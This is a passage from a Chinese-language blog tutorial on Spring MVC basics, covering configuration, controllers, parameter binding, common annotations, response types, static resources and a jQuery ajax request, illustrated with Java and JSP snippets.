class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 配置spring开启注解mvc的支持 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>&gt;</span><span class="tag">&lt;/<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里还有可能爆404的错，就是进不去controller，如果配置都写对的话，那就是没有导入依赖到web-info下的lib中，下图是导入后的，导入的话点put into output root就行。</p><p><img src="/2022/03/31/SpringMVC%E5%88%9D%E6%8E%A2/image-20220401161338812.png" alt="image-20220401161338812"></p><h3 id="写控制类-ControllerDemo"><a href="#写控制类-ControllerDemo" class="headerlink" title="写控制类 ControllerDemo"></a>写控制类 ControllerDemo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yutao.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ControllerDemo</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(path = &quot;/test&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">methodTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是Controller测试方法&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testSuccess&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="编写页面"><a href="#编写页面" class="headerlink" title="编写页面"></a>编写页面</h3><p>index.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h3&gt;这是主页面&lt;/h3&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;test&quot;</span>&gt;访问test试试&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>WEB-INFO-&gt;pages：testSuccess.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h3&gt;跳转成功&lt;/h3&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>然后就是配置tomcat.</p><h1 id="MVC请求流程"><a href="#MVC请求流程" class="headerlink" title="MVC请求流程"></a>MVC请求流程</h1><p><img src="/2022/03/31/SpringMVC%E5%88%9D%E6%8E%A2/image-20220331230653972.png" alt="image-20220331230653972"></p><p><strong>前端控制器（DispatcherServlet）</strong></p><ul><li>  接收用户请求，以及做出响应</li><li>  它负责调用其他组件处理用户的请求，控制整个流程的执行，想当于一个中央处理器</li><li>  它降低了组件之间的耦合行，利于组件之间的扩展</li></ul><p><strong>处理器映射器（HandlerMapping）</strong></p><ul><li>  根据用户请求的 URL 路径，通过注解或者 XML 配置，寻找匹配的 Handler 即处理器</li></ul><p><strong>处理器适配器（HandlerAdapter）</strong></p><ul><li>  根据映射器找到的处理器（Handler）信息，按照特定规则执行相关的 Handler （常称为 Controller）</li></ul><p><strong>处理器（Hander）</strong></p><ul><li>  这就是开发中要编写的具体业务逻辑控制器，执行相关的请求处理逻辑，并且返回相应的数据和视图信息，然后封装到 ModeAndView 对象中</li></ul><p><strong>视图解析器（View resolver）</strong></p><ul><li>  通过ModelAndView 对象中的 View 信息将逻辑视图名解析成物理视图名，即具体的页面地址，然后再生成 View 视图对象，最后对 View 进行渲染处理结果通过页面展示给用户</li></ul><p><strong>视图（View）</strong></p><ul><li>  本身是一个接口，实现类支持不同 View 类型 (JSP、FreeMarker、Excel 等)</li></ul><p>注：我们开发人员真正需要进行开发的是处理器（Handler）和视图（View）</p><p>也就是，处理用户请求的具体逻辑代码，以及展示给用户的界面</p><h1 id="请求映射与参数绑定"><a href="#请求映射与参数绑定" class="headerlink" title="请求映射与参数绑定"></a>请求映射与参数绑定</h1><h2 id="RequestMapping"><a href="#RequestMapping" class="headerlink" title="RequestMapping"></a>RequestMapping</h2><p><code>@RequestMaspping</code> 注解是指定控制器可以处理哪些URL请求，这个注解可以放在类或者方法上。</p><ul><li>  类上：一级访问目录</li><li>  方法上：二级访问目录</li></ul><p>参数：</p><ul><li>  path：指定请求路径的url</li><li>  value：value属性和path属性是一样的</li><li>  mthod：指定该方法的请求方式</li><li>  params：指定限制请求参数的条件</li><li>  headers：发送的请求中必须包含的请求头</li></ul><p>eg:<code>@RequestMaspping(/test)</code></p><h2 id="请求参数绑定"><a href="#请求参数绑定" class="headerlink" title="请求参数绑定"></a>请求参数绑定</h2><p>用户页面的请求一般都是键值对，传统javaweb使用<code>request.getParameter()</code>方法获取请求参数</p><p>而springMVC可以通过参数绑定，将客户端的k/v格式的数据绑定到controller处理器方法的形参上，支持的数据类型分为三类：</p><h3 id="基本类型和字符串类型"><a href="#基本类型和字符串类型" class="headerlink" title="基本类型和字符串类型"></a>基本类型和字符串类型</h3><p>以下均为部分：</p><p>index.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;user/testA?username=admin&amp;password=admin888&quot;</span>&gt;测试一下&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>testsuccess.jsp不变</p><p>userController：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yutao.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/testA&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testA</span><span class="params">(String username, String password)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;获取到的username: &quot;</span> + username);</span><br><span class="line">        System.out.println(<span class="string">&quot;获取到的password: &quot;</span> + password);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testSuccess&quot;</span>;</span><br><span class="line">        <span class="comment">//构造url：user/testA?username=admin&amp;password=admin888</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/03/31/SpringMVC%E5%88%9D%E6%8E%A2/image-20220331232035058.png" alt="image-20220331232035058"></p><h3 id="JavaBean实体类型"><a href="#JavaBean实体类型" class="headerlink" title="JavaBean实体类型"></a>JavaBean实体类型</h3><h4 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h4><blockquote><p>  JavaBeans是Java中一种特殊的类，可以将多个对象封装到一个对象（bean）中。特点是<strong>可序列化</strong>，<strong>提供无参构造器</strong>，<strong>提供getter方法和setter方法访问对象的属性</strong>。名称中的“Bean”是用于Java的可重用软件组件的惯用叫法。 –from 维基百科</p></blockquote><p>Javabean相比其他java类的特征：</p><ul><li>  提供一个默认的无参构造函数。</li><li>  需要被序列化并且实现了 Serializable 接口。</li><li>  可能有一系列可读写属性。</li><li>  可能有一系列的 getter 或 <strong>setter</strong> 方法。</li></ul><h4 id="code"><a href="#code" class="headerlink" title="code"></a>code</h4><p>1.jsp:</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: <span class="number">86177</span></span><br><span class="line">  Date: <span class="number">2022</span>/<span class="number">3</span>/<span class="number">31</span></span><br><span class="line">  Time: <span class="number">23</span>:<span class="number">35</span></span><br><span class="line">  To change <span class="keyword">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;javabean&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;user/testB&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    昵称: &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;nickname&quot;</span>&gt;&lt;br/&gt;</span><br><span class="line">    年龄: &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;age&quot;</span>&gt;&lt;br/&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>usercontroller:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testB&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testB</span><span class="params">(User user)</span> </span>&#123;</span><br><span class="line">        System.out.println(user);</span><br><span class="line">        System.out.println(<span class="string">&quot;nickname: &quot;</span> + user.getNickname());</span><br><span class="line">        System.out.println(<span class="string">&quot;age: &quot;</span> + user.getAge());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testSuccess&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>实体类user</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yutao.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String nickname;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getNickname</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.nickname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setNickname</span><span class="params">(String nickname)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.nickname = nickname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/03/31/SpringMVC%E5%88%9D%E6%8E%A2/image-20220331235316124.png" alt="image-20220331235316124"></p><h1 id="常用注解"><a href="#常用注解" class="headerlink" title="常用注解"></a>常用注解</h1><h2 id="RequestParam注解"><a href="#RequestParam注解" class="headerlink" title="RequestParam注解"></a>RequestParam注解</h2><ul><li>  作用：把请求中的指定名称的参数传递给控制器中的形参</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="meta">@RequestMapping(path = &quot;/hello&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">(<span class="meta">@RequestParam(value = &quot;nick&quot;, required = false)</span> String nickname)</span> </span>&#123;</span><br><span class="line">        System.out.println(nickname);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testSuccess&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="RequestBody注解"><a href="#RequestBody注解" class="headerlink" title="RequestBody注解"></a>RequestBody注解</h2><p>作用：用于获取请求体的内容（注：get方法不可以）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testC&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testC</span><span class="params">(<span class="meta">@RequestBody</span> String body)</span> </span>&#123;</span><br><span class="line">    System.out.println(body);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;testSuccess&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//post：nickname=BWH_Steven&amp;age=666&amp;address=beijing</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="PathVariable-注解"><a href="#PathVariable-注解" class="headerlink" title="PathVariable 注解"></a>PathVariable 注解</h2><p>用于绑定url中的占位符，例如：url中有/test/{id}，{id}就是占位符</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(path=&quot;/test/&#123;uid&#125;&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testD</span><span class="params">(<span class="meta">@PathVariable(value=&quot;uid&quot;)</span> String id)</span> </span>&#123;</span><br><span class="line">    System.out.println(id);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;testSuccess&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="RequestHeader注解"><a href="#RequestHeader注解" class="headerlink" title="RequestHeader注解"></a>RequestHeader注解</h2><ul><li>  作用：获取指定请求头的值</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testE&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testE</span><span class="params">(<span class="meta">@RequestHeader(value=&quot;Accept&quot;)</span> String header)</span> </span>&#123;</span><br><span class="line">    System.out.println(header);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;testSuccess&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br></pre></td></tr></table></figure><h2 id="CookieValue注解"><a href="#CookieValue注解" class="headerlink" title="CookieValue注解"></a>CookieValue注解</h2><ul><li>  作用：用于获取指定cookie的名称的值</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testF&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testF</span><span class="params">(<span class="meta">@CookieValue(value=&quot;JSESSIONID&quot;)</span> String cookieValue)</span> </span>&#123;</span><br><span class="line">        System.out.println(cookieValue);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testSuccess&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="相应数据以及结果视图"><a href="#相应数据以及结果视图" class="headerlink" title="相应数据以及结果视图"></a>相应数据以及结果视图</h1><p>接下来是：接受到用户的请求，并且进行一定的处理以后，如何进行正确的响应</p><h2 id="返回字符串"><a href="#返回字符串" class="headerlink" title="返回字符串"></a>返回字符串</h2><p>在前面的例子中，一直使用进行同名页面的跳转，例如返回 success 则跳转到 success.jsp 的页面中</p><p>需要注意的是，相应jsp页面中要写：<code>isELIgnored=&quot;false&quot;</code></p><h2 id="返回void"><a href="#返回void" class="headerlink" title="返回void"></a>返回void</h2><p>如果说直接去掉返回值，以及修改返回类型为void，会报出一个404异常看到地址栏中，去指向了一个 <code>http://localhost:8080/springmvc-response/user/testVoid.jsp</code> 的地址，也就是说它默认去查找了一个jsp页面（也就是 @RequestMapping(“/testVoid”) 值同名的 jsp），不过没有找到</p><p>如果想要在这种情况下，跳转页面可以使用请求转发，或者重定向跳转</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@RequestMapping(&quot;/testVoid&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testVoid</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;请求转发或者重定向被执行了&quot;</span>);</span><br><span class="line"><span class="comment">// 1. 请求转发</span></span><br><span class="line">        request.getRequestDispatcher(<span class="string">&quot;/WEB-INF/pages/testSuccess.jsp&quot;</span>).forward(request, response);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 重定向</span></span><br><span class="line"><span class="comment">// response.sendRedirect(request.getContextPath()+&quot;/test2.jsp&quot;);</span></span><br><span class="line"></span><br><span class="line">        response.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"><span class="comment">// 3. 直接响应数据</span></span><br><span class="line">        response.getWriter().print(<span class="string">&quot;测试被执行了哈&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="返回值是ModelAndView对象"><a href="#返回值是ModelAndView对象" class="headerlink" title="返回值是ModelAndView对象"></a>返回值是ModelAndView对象</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/findUser&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ModelAndView <span class="title">findUser</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ModelAndView modelAndView = <span class="keyword">new</span> ModelAndView();</span><br><span class="line">        <span class="comment">//跳转到jsp</span></span><br><span class="line">        modelAndView.setViewName(<span class="string">&quot;success&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//模拟从数据库中查询用户信息</span></span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setNickname(<span class="string">&quot;李四&quot;</span>);</span><br><span class="line">        user.setAge(<span class="number">8888</span>);</span><br><span class="line"></span><br><span class="line">        modelAndView.addObject(<span class="string">&quot;user&quot;</span>, user);</span><br><span class="line">        <span class="keyword">return</span> modelAndView;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>success.jsp:</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;user.username&#125;</span><br><span class="line">$&#123;user.password&#125;</span><br></pre></td></tr></table></figure><h2 id="过滤静态资源"><a href="#过滤静态资源" class="headerlink" title="过滤静态资源"></a>过滤静态资源</h2><p>在 web.xml 中配置的 DispatcherServle（前端控制器），会拦截到所有的资源静态资源 （img、css、js）这样的文件也被拦截下面写如何不对静态资源进行拦截：</p><p>在springmvc.xml中配置</p><p>mvc:resources 标签配置不过滤</p><ul><li>  location 表示webapp目录下的包下的所有文件</li><li>  mapping 表示以/xxx开头的所有请求路径，如/xxx/a 或者/xxx/a/b</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--前端控制器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:resources</span> <span class="attr">mapping</span>=<span class="string">&quot;/css/**/&quot;</span> <span class="attr">location</span>=<span class="string">&quot;/css/&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:resources</span> <span class="attr">mapping</span>=<span class="string">&quot;/images/**/&quot;</span> <span class="attr">location</span>=<span class="string">&quot;/images/&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:resources</span> <span class="attr">mapping</span>=<span class="string">&quot;/js/**/&quot;</span> <span class="attr">location</span>=<span class="string">&quot;/js/&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;%--引入jquery--%&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;js/jquery-2.1.0.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        $(function () &#123;</span><br><span class="line">            $(<span class="string">&quot;#btn&quot;</span>).click(function () &#123;</span><br><span class="line">                alert(<span class="string">&quot;Just for test&quot;</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;%--&lt;a href=<span class="string">&quot;user/testString&quot;</span>&gt;修改用户信息页面&lt;/a&gt;--%&gt;</span><br><span class="line">    &lt;%--&lt;a href=<span class="string">&quot;user/testForward&quot;</span>&gt;测试一下&lt;/a&gt;--%&gt;</span><br><span class="line">    &lt;button id=<span class="string">&quot;btn&quot;</span>&gt;发送ajax请求&lt;/button&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="发送ajax请求"><a href="#发送ajax请求" class="headerlink" title="发送ajax请求"></a>发送ajax请求</h2><p>index.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;%--引入jquery--%&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;js/jquery-2.1.0.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        $(function () &#123;</span><br><span class="line">            $(<span class="string">&quot;#btn&quot;</span>).click(function () &#123;</span><br><span class="line">                <span class="comment">//发送ajax请求</span></span><br><span class="line">                $.ajax(&#123;</span><br><span class="line">                    url:<span class="string">&quot;user/testAjax&quot;</span>,</span><br><span class="line">                    contentType:<span class="string">&quot;application/json;charset=UTF-8&quot;</span>,</span><br><span class="line">                    data:<span class="string">&#x27;&#123;&quot;username&quot;:&quot;zhangsan&quot;,&quot;password&quot;:&quot;888888&quot;&#125;&#x27;</span>,</span><br><span class="line">                    dataType:<span class="string">&quot;json&quot;</span>,</span><br><span class="line">                    type:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">                    success:function (data) &#123;</span><br><span class="line">                        <span class="comment">//解析响应数据</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span 